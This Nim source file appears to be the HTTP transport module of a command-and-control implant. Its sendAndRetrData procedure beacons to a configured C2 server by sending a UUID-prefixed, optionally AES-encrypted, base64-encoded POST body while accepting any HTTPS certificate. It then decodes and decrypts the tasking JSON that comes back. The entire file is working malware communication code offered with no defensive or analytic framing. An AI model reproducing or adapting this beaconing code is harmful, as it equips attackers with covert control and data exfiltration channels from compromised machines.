when defined(ENCRYPT_TRAFFIC):
  import ../crypto

import json
import puppy
import std/options
import strutils
import ../structs
import ../config
import ../b64

template DBG(msg: string) =
  when defined(debug):
    echo msg

var didLogHeaders = false


#[
  A generic init function - not requried for HTTP
]#
proc initialize*() =
  discard


#[
  This functions sends the data
  to the C2 Server and retrieves the returned data.
  It handles the base64 encoding and eventually the
  encryption
]#
proc sendAndRetrData*(data: JsonNode): Option[JsonNode]  =

  var remoteUrl = ""
  var uuid = ""

  remoteUrl = connection.remoteEndpoint & ":" & $connection.callbackPort & "/" & connection.postEndpoint
  #remoteUrl = connection.remoteEndpoint & "/" & connection.postEndpoint
  uuid = connection.uuid


  # When using AES encrypted traffic, encrypt the data
  # string to return the encrypted byte sequence
  # if NOT: only convert to seq as this is later used as seq and
  # not as string anymore var encData: seq[byte]
  var encData: seq[byte]

  when defined(ENCRYPT_TRAFFIC):
    encData = encrypt($data, connection.encryptionKey)
  else:
    encData = cast[seq[byte]]($data)


  # Build the POST Request that gets send to
  # the C2
  let req = Request(
    url: parseUrl(remoteUrl),
    headers: connection.httpHeaders,
    verb: "post",
    body: b64.encode(Base64Pad, cast[seq[byte]](uuid) & encData), # do the base64 encoding here "{uuid}{data}"
    timeout: 15.0,
    allowAnyHttpsCertificate: true
  )

  try:
    DBG("[*] Sending HTTP beacon to " & remoteUrl)
    if not didLogHeaders:
      didLogHeaders = true
      for header in connection.httpHeaders:
        DBG("[*] Header -> " & header.key & ": " & header.value)

    # Send the reuqest
    let response = fetch(req)
    DBG("[*] HTTP response code: " & $response.code)

    # A non-200 status code means that something with
    # the request was wrong (Should not really happen)
    if response.code != 200:
      DBG("[-] Non-200 response from C2")
      return none(JsonNode)

    # get the response body, decode the base64 and parse the uuid and json struct
    let respText = response.body.strip()
    var respBody: seq[byte]
    var decoded = false

    if len(respText) == 0:
      DBG("[-] Empty response body from C2")
      return none(JsonNode)

    # First try normal base64 decoding
    try:
      respBody = b64.decode(Base64Pad, respText)
      decoded = true
    except Base64Error:
      discard

    # Fallback for URL-safe base64 variants
    if not decoded:
      let normalizedResp = respText.replace('-', '+').replace('_', '/')
      try:
        respBody = b64.decode(Base64Pad, normalizedResp)
        decoded = true
      except Base64Error:
        discard

    if not decoded:
      var preview = respText
      if len(preview) > 120:
        preview = preview[0..119] & "..."
      DBG("[-] Invalid base64 response from C2. HTTP code: " & $response.code & " body preview: " & preview)
      return none(JsonNode)

    if len(respBody) < 36:
      DBG("[-] Decoded response too short (missing UUID prefix). HTTP code: " & $response.code)
      return none(JsonNode)

    var respJson: string

    when defined(ENCRYPT_TRAFFIC):
      let encRespJson = respBody[36..len(respBody)-1]
      respJson = decrypt(encRespJson, connection.encryptionKey)
    else:
      respJson = cast[string](respBody)[36..len(respBody)-1]


    let asJson = parseJson(respJson)
    return some(asJson) # return the JsonNode

  except PuppyError:
    DBG("[-] Failed to send request to C2 (timeout/network/SSL error)")
    return none(JsonNode)


